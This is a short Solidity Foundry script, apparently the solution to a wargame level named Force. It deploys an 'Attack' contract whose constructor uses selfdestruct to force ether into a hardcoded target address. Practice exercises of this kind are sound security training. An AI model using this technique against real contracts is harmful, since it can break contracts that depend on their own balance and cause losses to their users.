// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Force.sol";

contract ForceScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack{value: 1}();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() payable {
        Force target = Force(0xf18f13Ef3266359aFa222969E55e0786C53A022e);
        selfdestruct(payable(address(target)));
    }
}